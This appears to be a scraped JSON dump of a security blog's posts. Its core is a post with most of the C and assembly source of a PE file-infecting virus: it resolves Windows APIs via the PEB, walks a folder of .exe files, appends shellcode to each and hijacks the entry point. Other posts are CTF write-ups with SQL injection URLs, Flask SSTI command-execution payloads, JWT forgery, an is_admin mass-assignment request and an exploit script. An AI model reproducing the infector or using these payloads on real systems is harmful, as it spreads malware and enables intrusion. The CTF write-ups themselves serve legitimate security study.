645210810something=286513783515614922964487317633030845022199764334523704172857900468207328275601546483407711018702750569030377856457729134725585035340273850696372794971562057097878568322145360455616114805337204320995794956912354651091693657156422658881160865975268727450032165425473533693410304381371095831091118583746948774725405739487325458903660189348971842364607739242225293967215501191421774709879078076074161789004913628127600135108988375932151821980659991278616990695976636258955726402697510230023838942094639019441749484792888646404524697026596867444210593464034174763857812793583906156073077832265794741963441612539965049158860120119167347530684129840646220683525848056119433617113962506545054683798313759769240061077256966777326661431711874356368294140866366364716767053776009140934309044595124213623948792672967896390820967208318303287692916619220370506456013211642234660990531096377697018415439879456848769444607806947569088449625nothing=251560377963038761190200797029988859033e = 65537A=pow(2,e*something-e*nothing,n)-1p = gmpy2.gcd(A,n)q = n // pd = gmpy2.invert(e,(p-1)*(q-1))m = pow(enc, d, n)flag = long_to_bytes(m)print(flag)","link":"/2020/02/02/HEBCTF-easy_RSA-WriteUp/"},{"title":"MaliciousCode-FileInfect","text":"MaliciousCode-FileInfect本篇博客的主要目的在于记录学习，由于内容涉及不安全因素，不做特别详细的解释，学习需要的可以私信。这是一篇对一个实验项目的记录，实验的目的和关键如下： 实验目的：编写shellcode，通过利用系统动态链接库调用API从而实现对目标文件夹内文件的感染。 相关知识：需要熟知PE文件结构 涉及到的API有：CreateFileA、GetFileSize、CreateFileMapping、MapViewOfFile、UnmapViewOfFile、CloseHandle、FindFirstFileA、FindNextFileA、FindClose、LoadLibraryA、GetProcAddress 主要思路1、通过C+汇编编程找到kernel32.dll的地址，从而才能进一步查找其他API的地址；2、利用PE文件结构找到各类函数的地址；3、然后利用API对目标文件夹内的文件进行感染。 主要代码分析前面说了本篇博客的主要目的是记录学习，所以放一些主要部分的代码以供学习参考。下面我们对主要函数进行分析： 1、GetKernel32Base函数功能是获取系统kernel32.dll加载到内存中的基址，需要对Windows的PEB以及PE结构有比较深的认识，这里可以参考FREEBUF上的三篇博客：https://www.freebuf.com/articles/system/93983.htmlhttps://www.freebuf.com/articles/system/94774.htmlhttps://www.freebuf.com/articles/system/97215.html主要代码如下： DWORD GetKernel32Base(){ DWORD base; _asm { xor ecx, ecx; mov eax, fs:[ecx + 0x30]; //EAX = PEB mov eax, [eax + 0xc]; //EAX = PEB-&gt;Ldr mov esi, [eax + 0x14]; //ESI = PEB-&gt;Ldr.InMemOrder lodsd jmp Get_Function L1 : xchg eax, esi; lodsd Get_Function : mov ebx, [eax + 0x28]; cmp dword ptr[ebx], 0x0045004B; //前四字节 jnz L1 cmp dword ptr[ebx + 0x4], 0x004E0052; //下一个四字节 jnz L1 cmp dword ptr[ebx + 0x8], 0x004C0045; //第三个四字节 jnz L1 mov ebx, [eax + 0x10]; //EBX = Base address mov base, ebx; } return base;} 这里我自己写了一个通过比对DLL名称来查找目标DLL的函数，以增强不同Windows系统版本的适用性。 2、GetAllAPIAddress函数的功能是查找所有目标API的地址，代码如下： void GetAllAPIAddress(DWORD DllBase,char * ApiNameBase){ int i = 0; DWORD * p = (DWORD *)(ApiNameBase + API_ADDRESS_OFFSET); //在存放函数名的160个字节后面紧跟着存放函数地址 while( *((WORD *)(ApiNameBase + i)) != 0) { *p = GetAPIAddress((unsigned char *)DllBase, //把函数地址逐个存到p指向的位置 ApiNameBase + i); p++; while ( *(ApiNameBase + i) != 0) i++; //将地址指针指向下一个需要对比的函数名的开头字符处 i++;//每一个字符串后只有一个0结尾 } } 该函数调用GetAPIAddress函数逐个查找ApiName数组中存放的函数名，让后将地址保存到160个字节的数组空间的后面，通过判断字符串尾部\\x0判断字符串的结束，以这种方式逐个查找函数地址。 3、GetAPIAddress我们从GetAllAPIAddress的代码中看到，它是通过调用GetAPIAddress来查找到每一个API的地址的，主要也是利用PE文件的结果实现的： DWORD GetAPIAddress(unsigned char * pDllBase,char * ApiName){ unsigned char * DllApiName; int index; PIMAGE_DOS_HEADER pdos_head; PIMAGE_NT_HEADERS32 pPeHeader; PIMAGE_EXPORT_DIRECTORY pExport; pdos_head = (PIMAGE_DOS_HEADER )pDllBase; //此处是得到了DOS头的基址，后面找其他结构都是偏移地址，加上此处的基址才是实际在内存的地址 pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)pdos_head + pdos_head-&gt;e_lfanew);//得到PE文件头的位置 //得到导出表的位置VA pExport = (PIMAGE_EXPORT_DIRECTORY)&amp;pDllBase[ pPeHeader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress]; index = 0; //函数地址的索引 while(index &lt; pExport-&gt;NumberOfNames) { DllApiName = pDllBase + *((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfNames + (index &lt;&lt; 2)]) ; //将索引左移2bit是扩大四倍，因为地址是四个字节 if (CmpStr(ApiName,(char *)DllApiName) == TRUE) break; //对比函数名，从而找到函数地址，成功则跳出循环 index ++; } if (index == pExport-&gt;NumberOfNames) return 0; //查找失败，返回0 index = ((WORD *)&amp;pDllBase[pExport-&gt;AddressOfNameOrdinals])[index]; return ((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfFunctions])[index] + pPeHeader-&gt;OptionalHeader.ImageBase;//函数名对应的偏移地址加镜像基址，即得到了函数在内存中的地址} 该函数通过传入的pDllBase(其实就是kernel32.dll在内存中的基址)，找到dll文件的PE头位置，然后利用PE头结构找到其中可选头里的导出表，kernel32.dll的导出表里AddressOfNameOrdinals存储了函数名序号表的RVA，这里利用index索引进行比较，比对成功后，最后返回的时候加上镜像基址ImageBase就拿到了函数地址. 这里我们可以参考导出表结构: 4、SearchDirectory代码如下： void SearchDirectory(DWORD * ApiAddressArray){ MyFindFirstFileA f_FindFirstFile; MyFindNextFileA f_FindNextFile; MyFindClose f_FindClose; WIN32_FIND_DATA FindFileData; //装载与找到的文件有关的信息 char buf[512];// = \"c:\\\\test\\\\*.exe\";//\"c:\\test\\*.exe\" int i; HANDLE hFind; //strcpy(buf,\"c:\\\\test\\\\*.exe\"); *((DWORD *)buf) = 't\\\\:c'; *((DWORD *)(buf + 4)) = '\\\\tse'; *((DWORD *)(buf + 8)) = 'xe.*'; *((DWORD *)(buf + 12)) = 'e'; f_FindFirstFile = (MyFindFirstFileA)(*(ApiAddressArray + FindFirstFileA_OFFSET));//调用FindFirstFileA函数搜索指定文件夹 f_FindNextFile = (MyFindNextFileA)(*(ApiAddressArray + FindNextFileA_OFFSET)); //该函数判断当前目录下是否有下一个目录或文件 f_FindClose = (MyFindClose)(*(ApiAddressArray + FindClose_OFFSET)); //释放由FindFirstFileA分配的内存 hFind = f_FindFirstFile(buf,&amp;FindFileData); //把找到文件有关信息存入FindFileData if (hFind != INVALID_HANDLE_VALUE) { do { for(i = 0; FindFileData.cFileName[i]!= 0; i++) { buf[8 + i] = FindFileData.cFileName[i]; } buf[8 + i] = 0; //从8个偏移的位置开始把找到的文件名写入buf，从而构造一个文件完整的路径，并且将字符串末尾置0表示结束 MyInfect(ApiAddressArray,buf); }while (0 != f_FindNextFile(hFind,&amp;FindFileData)); //判断是否还有文件，若没有，则感染结束 f_FindClose(hFind); //释放由FindFirstFileA分配的内存 }} 该函数主要利用FindFisrtFileA、FindNextFileA、FindClose三个API完成打开文件、对指定文件夹进行遍历、最后关闭句柄内存的过程。，每成功找到一个文件便调用MyInfect函数对该文件进行感染。 5、MyInfect代码如下： BOOL MyInfect(DWORD * ApiAddressArray, char * FileName){ void * pBase; DWORD VirusSize; DWORD VirusStart = (DWORD)ApiAddressArray - 160 - 7; //从函数地址数组地址往前160字节是函数名数组起始位置，再往前7字节是main.cpp种的前几条指令 VirusSize = 0x2000; //写入shellcode的大小，根据程序内部的情况设置太大不好，设置太小也不行 pBase = MapFileToMemory(ApiAddressArray, FileName); if (pBase == NULL) { return FALSE; } if (PutShellcodeToLastSection_0(pBase,(char *)VirusStart,VirusSize) == FALSE) { return FALSE; } WriteToFile(ApiAddressArray, pBase); return TRUE;} MyInfect函数里对写入shellcode的起始位置进行了设置：VirusStart，同时设置了写入shellcode的大小的VirusSize，这个大小由项目生成的可执行程序里的text节的尺寸决定，因为shellcode都在此节内存着。然后调用MapFileToMemory函数得到映射视图文件的开始地址值并赋值给pBase，然后调用PutShellcodeToLastSection_0函数对目标文件进行感染，成功感染之后，调用WriteToFile函数停止当前程序的一个内存映射，将映像到内存中的文件写回磁盘。 6、MapFileToMemory代码如下： void * MapFileToMemory(DWORD * ApiAddressArray, char * FileName ){ HANDLE hFile, hMapping; DWORD FileSize; MyCreateFileA f_CreateFileA; MyGetFileSize f_GetFileSize; MyCreateFileMappingA f_CreateFileMappingA; MyMapViewOfFile f_MapViewOfFile; MyCloseHandle f_CloseHandle; void * pBase; f_CreateFileA = (MyCreateFileA) (*(ApiAddressArray + CreateFileA_OFFSET)); f_GetFileSize = (MyGetFileSize) (*(ApiAddressArray + GetFileSize_OFFSET)); f_CreateFileMappingA = (MyCreateFileMappingA) (*(ApiAddressArray + CreateFileMapping_OFFSET)); f_MapViewOfFile = (MyMapViewOfFile) (*(ApiAddressArray + MapViewOfFile_OFFSET)); f_CloseHandle = (MyCloseHandle) (*(ApiAddressArray + CloseHandle_OFFSET)); hFile = f_CreateFileA(FileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);//打开要感染的目标文件，并用hFile句柄与之关联 if (hFile == INVALID_HANDLE_VALUE) { return NULL; } FileSize = f_GetFileSize(hFile,NULL);//获取文件大小 //创建文件映射 if (!(hMapping = f_CreateFileMappingA(hFile, 0, PAGE_READWRITE | SEC_COMMIT, 0, FileSize + 20*1024, 0))) //为何高32位为0，低32位这么大？ { f_CloseHandle(hFile); //CreateFileMappingA返回0则创建失败，关闭句柄 return NULL; } //将文件内容映射到内存中，并获取内存的首地址，写入m_BasePointer，映射方式：将文件映射对象hMapping映射到当前应用程序的地址空间 if (!(pBase = f_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0))) { f_CloseHandle(hMapping); //如果返回0则映射失败，并关闭两个句柄，成功则返回映射视图文件的开始地址值到pBase f_CloseHandle(hFile); return NULL; } f_CloseHandle(hMapping); f_CloseHandle(hFile); return pBase;} 此函数通过调用CreateFileA、GetFileSize、CreateFileMappingA、MapViewOfFile、CloseHandle等API，将指定的文件打开，如果成功打开文件，则获取文件的大小，然后将文件映射到内存并获取映射到内存中的首地址，并返回给pBase。 7、PutShellcodeToLastSection_0代码如下： BOOL PutShellcodeToLastSection_0(void * pBase,char * pVirus,DWORD VirusSize){ int addsize; int temp; IMAGE_DOS_HEADER * dos_head; PIMAGE_SECTION_HEADER pLastSectionInfo; IMAGE_NT_HEADERS32 * pPeHeader; DWORD CopyPos; DWORD OldEntryPointRVA; dos_head = (IMAGE_DOS_HEADER *)pBase; //基址指向可执行文件的dos头 pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)dos_head + dos_head-&gt;e_lfanew);//得到PE文件头的位置 pLastSectionInfo = GetLastSectionInfo(pBase); if (!IfLastSectionCanBeInfected(pLastSectionInfo)) return FALSE; if ((addsize = NeedLastSectionEnlargeSize(pLastSectionInfo,VirusSize)) != 0)//需要扩大节的大小 { temp = AlignToFile(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData + addsize); pPeHeader-&gt;OptionalHeader.SizeOfImage += AlignToSection(pPeHeader,temp) - AlignToSection(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData); pLastSectionInfo-&gt;SizeOfRawData = temp; } //修改节属性，使之属于可执行节 pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ; //设定新的入口点，指向病毒shell OldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//记录旧的入口点 pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo); //把病毒shell拷贝到尾节的位置 CopyPos = GetShellcodeRawPos(pLastSectionInfo); pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize; for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//在文件中最后一节后面逐个写入设立了code *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //在最后一节的EntryPointPos大小的偏移处写入旧的入口点 return TRUE;} 该函数利用上一个函数传回的pBase，以及VirusStart和VirusSize，将指定位置和长度的shellcode写入pBase指向的文件内存映射中。由函数的前半部分代码逻辑我们可知，该函数先通过pBase得到待感染文件的DOS头，然后利用如图的结构找到PE头然后利用IfLastSectionCanBeInfected函数判断文件的最后一节是否可以被感染，函数主要判断最后一节是否时可丢弃的或者该块的大小是否超过了物理大小而判断是否可以被感染。某一节块是否能被感染的属性如下图：判断了是否能被感染之后，如果可以被感染，则调用NeedLastSectionEnlargeSize函数判断最后一节的大小是否足够写入shellcode，函数返回零则不必扩大，返回大于0的值即为需要扩大的尺寸，便继续执行代码利用AlignToFile和AlignToSection进行扩大节的操作。此过程结束后，便可以正式进行shellcode写入了，代码： //修改节属性，使之属于可执行节pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ;//设定新的入口点，指向病毒shellOldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//记录旧的入口点pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo);//把病毒shell拷贝到尾节的位置CopyPos = GetShellcodeRawPos(pLastSectionInfo);pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize;for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//在文件中最后一节后面逐个写入设立了code*((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //在最后一节的EntryPointPos大小的偏移处写入旧的入口点 该部分代码先对节的属性进行修改，使之成为可执行的，然后记录旧的入口点到OldEntryPointRVA，并通过GetShellcodeRVA函数拿到写入shellcode之后的新入口点。然后利用GetShellcodeRawPos函数得到写入shellcode的位置，即最后一节的末尾处，至此便正式进行shellcode的写入，利用for循环将shellcode写入文件。 关键点之一：EntryPointPos这一点很重要，在EntryPointPos偏移处写入程序原来的入口点，EntryPointPos在项目中起始的赋值为0xea，即234字节的偏移，这里我们着重讲一下:通过分析被写入的shellcode的结构，如下图：计算得知，红线以上部分存入的是主函数中的push 89898989h(为写入旧的入口点保留的四字节空间)前的234字节的汇编指令和数据：函数名和函数的地址（函数的地址写入到了函数名数组向后偏移160个字节的位置），而89898989h处的四个字节则是通过下面的代码被覆盖成函数原来的入口点的地址： *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; 这一点很重要，因为当我们需要向函数名数组中加入新的API函数名时，存储函数地址的空间也会变大，那么写入89898989h的位置则会向后移动，欲覆盖此位置则需要改变EntryPointPos的大小，从而保证能够正确跳转会原入口点使程序正常运行。 8、main最后看一下主函数： __declspec(naked) void MyEntryPoint(){ _asm { pushad //将所有的32位通用寄存器压入堆栈 pushfd //然后将32位标志寄存器EFLAGS压入堆栈 call L1 //利用call/pop组合压入数据 } _MYDATA _asm {L1: pop ebx } RealBegin(); _asm { popfd //32位标志寄存器出栈 popad //32位通用寄存器出栈 mov eax,fs:[30h] mov eax,[eax + 08h] cmp dword ptr [eax + 2],'xxxx' //判断是否是自身程序 jz L2 //如果找到了标志，程序结束 push 89898989h //为程序原入口点开辟四个字节的空间L2: ret }} 主函数利用call/pop组合将_MYDATA中存放的函数名压入栈，然后调用RealBegin函数实现恶意代码的注入，RealBegin函数中都是利用前面提到的函数来实现功能，不过的赘述。这里，通过比对魔数MZ后四个字节的值是否为xxxx来判断程序是我们写的恶意程序本身还是被感染的函数，从而根据判断结果决定退出执行还是写入89898989h这个存放入口点的位置。 其他关键内容在编写和完善代码的过程中，很多细节需要注意，否则就会出现难以预期的问题，我在实验过程中遇到的几个关键问题如下：1、设置VirusSize的大小对VirusSize进行设置，这个地方我们先设置个适当大点的值0x2000，调试之后查看生成可执行文件的text节的大小，然后应当用扩大之后替换VirusSize之前的值。由图可知可以将VirusSize设置为比0x838稍微大的值，以免感染文件写入shellcode时写不全。不过设置的再大些也没有问题，前提是能存下shellcode。2、偏移EntryPointPos的设置代码中对EntryPointPos的定义如下： #define EntryPointPos 0xf2 //0xea=234、0xf2=242，这个是写入原入口点的位置，如果读入别的函数地址，这个偏移需要更改，这里为了弹出窗口，//我们又读入了两个函数的地址，因此向后多偏移了8个字节，故入口点写入的位置也要向后偏移8个字节。 前面提到了这是记录写入原入口点地址偏移的地方，比如当读取10个函数的地址的时候，该偏移大小为0xea恰好能偏移到89898989h的地方，然后覆盖成为原入口点地址，而当我们又多读取了两个函数的地址，那么89898989h也将会向后移动8个字节（这一点是不一定的，因为我们加入两个函数名，160个字节大小的数组空间足够放下函数名，故API_ADDRESS_OFFSET的值160不用变，而当需要加入其它API名的时候，160个字节存不下函数名时，这个地方也要扩大，向后偏移的大小会更大，所以需要根据实际情况来分析），我们可以通过观察文件结构来分析，更为直观： 1、首先，我们写入新的两个函数之后，不对EntryPointPos进行更改，那原程序的入口点（实验中用到的calc.exe的原始入口点的VA为01012475h）将会仍然被写到偏移为0xea的地方，而89898989h将会存在于后面几个字节的地方，如图：红色框内是入口点写入到0xea个偏移的位置，黄色标记是89898989h被写入的地方，没有成功被覆盖，因此被感染的程序最后只能蜂鸣而不能正常运行。 2、修改程序，将EntryPointPos改为0xf2(242)，然后再次感染，看一下效果：我们发现01012475h被写入到原来的89898989h位置，经过测试，成功感染。此时便能利用LoadLibraryA和GetProcAddress函数找到MessageBoxA进行弹窗。 总结自己在本次实验中深刻学习了感染目标程序的机制，关键点就在于：写入shellcode、更改入口点等主要作用的实现都离不开对PE文件结构的操作。基础不牢、地动山摇呀！最后再次声明：本篇博客只用于记录学习！","link":"/2020/02/03/MaliciousCode-FileInfect/"},{"title":"RootersCTF复现","text":"国外的题目还是比较有意思的，建议同僚们多关注CTFtime上的国外比赛，做不做的出题不重要，拓展视野还是很有必要滴😄 RootersCTF-BabywebMy junior dev just set up a password protected webpage. Can you get in? 分析过程打开链接提示管理员的密码是18位，并且过滤掉了UNION SLEEP ‘ “ OR - BENCHMARK。因此利用爆破出密码是比较不现实的，结合题目提示是使用注入方法。看到单引号和双引号被过滤，猜测是被反斜杠转义掉，便尝试宽字节注入，使用%df%27进行测试，结果注入失败。 并且提示UNION、OR也都被过滤，原本想着利用大小写或者编码绕过，但是引号既然不能成功绕过，说明不能用闭合引号进行注入。经过多次尝试发现利用extractvalue()函数进行报错注入可以成功实现注入,因此可以结合concat函数实现注入。 extractvalue()：函数功能是从目标XML中返回包含所查询值的字符串。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) extractvalue注入的原理：如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。 注入过程1、爆库名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select%0adatabase()),0x7e)) 回显XPATH syntax error:~SQLinjection~，爆出了库名SQLinjection2、爆表名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) 回显XPATH syntax error:~users~，爆出了表名users这里需要说名一下，由于单双引号被过滤，故注入语句中如果有字符串需要单双引号，应当尽量避免，这里可以使用查询语句的多重利用避免，当然直接填库名也是不需要单双引号的（下面表名同理）。3、爆列名 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=(select group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e)) 回显XPATH syntax error:~user、uniqueid~，爆出列名user、uniqueid，这两个列里肯定有我们需要的重要内容。4、爆字段 https://babyweb.rootersctf.in/index.php?search=1 and extractvalue(1,concat(0x7e,(select uniqueid/user from users limit 1),0x7e)) 这里分两步分别爆出admin和其对应的18位的uniqueid，拿去尝试登录，成功登路并拿到flag。由于环境不能复现，做题的时候也没有截图，这里不再贴出图片。 报错注入参考链接：https://www.jianshu.com/p/bf5edd484957 I_&lt;3_Flask典型的SSTI，参考国外师傅的WP学到了一些新姿势 题目分析进入题目： 断定是python flask的SSTI了，但是不知道参数是啥，在复现的时候发现国外师傅提到一个参数扫描的工具arjun，直接扫参数： 用name参数测试一下： 可以看到成功注入，那下面就是利用注入姿势来爆flag了。 解题一种解题的payload是： name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()')}} name={{''.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__['__builtins__'].eval('__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()')}} 但是这种方法在复现的时候没有成功，学到另外一种姿势： name={{url_for.__globals__['__builtins__'].open('flag.txt').read()}} 参考：https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2 ImgXweb考察JWT伪造攻击。 题目分析进入题目发现存在注册、登录按钮，先注册一个登录看看，发现可以进行文件上传，但是奈何本题不是考文件上传拿shell的… 通过扫后台发现robots.txt的存在（可见扫后台的重要性啊）： 而robots.txt中提示了一个secretkey秘钥文件的存在，内容如下： 给这个干嘛？结果抓包发现了另一番天地： 可以看到cookie采用了JWT，拿去base64解密一下（还有几篇讲到JWT伪造攻击的博客，有需要的可以看看）： {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}{&quot;user&quot;:&quot;ggb0n&quot;}\u0006×¿ð¬Á#È¬\u0002­ \u0018\u0001í_mn×Z\u001cüt 这肯定是考JWT伪造的了，秘钥都给了，多简单，拿去网站伪造一下： 然后抓包改包，发现成功伪造了admin身份，从回显页面中可以看到flag.png的存在，这里赵师傅没有放原图，应该是为了方便BOT生成和识别固定格式的flag吧： 其实，flag已经很近了，查看源码可以看到flag.png的存储路径，直接访问即可拿到flag： 原来png不是png，而是txt啊…赵师傅badbad。。。 notifyxapi还是考察JWT伪造攻击。 题目分析进入题目，看到给出了几个利用curl进行注册、登录、查看通知的几个操作： 有点像教怎么用curl的[手动滑稽]，我们根据提供的语句去试试效果： 先注册个账户： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"created_user\":{\"id\":3,\"user\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc\"}} 关注的点来了：is_admin属性为false，多半知道这题是干嘛的了。先不管，先登录看看： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"ggb0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"ggb0n@test.com\",\"id\":3,\"is_admin\":false},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo\"} 可以看到登录和注册的时候JWT的第三部分是不同的，也就是表示登录的状态，看通知的话，当然要先登录嘛。 拿登录上的JWT去看看notification什么情况： curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" [{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"}] 通过这个请求，我们可以看到别的用户发的通知，想必管理员能看到不一样的结果吧，结合前面存在的is_admin属性并且为false，思路肯定是要去想办法让is_admin为true了。 解题由于回显的都是注册时候的键值对，我们直接在注册的时候多加一个&quot;id_admin&quot;:true的属性键值对创建个账户试试： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": 1\"password\",\"is_admin\":true}' {\"created_user\":{\"id\":4,\"user\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw\"}} 可见账户成功创建了，并且此时is_admin属性已经为true了，快登陆去看看通知： curl -X POST \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/\" -H \"Content-Type: application/json\" -d '{\"email\": \"gg.b0n@test.com\", \"password\": \"password\"}' {\"id\":{\"email\":\"gg.b0n@test.com\",\"id\":4,\"is_admin\":true},\"authentication_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"} 用登录上的JWT去看通知： export ACCESS=\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM\"curl -H \"Authorization: Bearer $ACCESS\" -H \"Content-Type: application/json\" \"http://ebd88188-17ee-4d51-84e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/\" 回显如下： [{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"rooters{a_big_hard_business_in_a_big_hard_building}ctf\",\"id\":1,\"title\":\"flag\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"hey, rosssssss\",\"id\":2,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"test@test.com\",\"id\":2},\"body\":\"Jen Barber? Is that the internet?\",\"id\":3,\"title\":\"The IT Crowd\"},{\"issuer\":{\"email\":\"admin@test.com\",\"id\":1},\"body\":\"flag{1b411b83-d725-4e8f-a50a-3bd14a35de6a}\",\"id\":1,\"title\":\"flag\"}] 成功拿到flag。这题算是考察JWT伪造比较简单的了吧。","link":"/2020/03/13/RootersCTF%E5%A4%8D%E7%8E%B0/"},{"title":"UNCTF-Twice_Insert WriteUp","text":"UNCTF大法好 UNCTF-Twice_Insert原理分析题目提示twice-insert，分析是利用二次注入获取admin密码或者是暴库拿flag。 解题过程1）访问目标主机，打开页面发现是sqli-labs-24，原题是利用二次注入修改admin密码，这题修改admin密码却没有flag，要想拿到flag可能需要爆库。2）根据题意，尝试布尔盲注 发现or被过滤，如此需要换一个思路，因为有注册按钮，尝试注册新用户。 3)注册一个新用户scl，password为1，然后注册用户scl’and 1#（该用户名用于测试注入），password为1，用于后面的测试修改用户scl’and 1#的密码为0修改成功：4)将scl的密码重置为1：注册新的用户scl’and 0#，password为1，然后登陆该账号修改密码回显如下：密码更新失败，说明存在布尔盲注。 编写EXP写python脚本，通过多次注册用户、修改密码，进行暴库。 #coding = utf-8import requestsurl = \"http://183.129.189.60:10003/sqli/Less-24/login_create.php\"url1 = \"http://183.129.189.60:10003/sqli/Less-24/login.php\"url2 = \"http://183.129.189.60:10003/sqli/Less-24/pass_change.php\"#将密码改回1def change21(): user = \"scl\" s = requests.session() data = { \"login_user\": user, \"login_password\": '0', 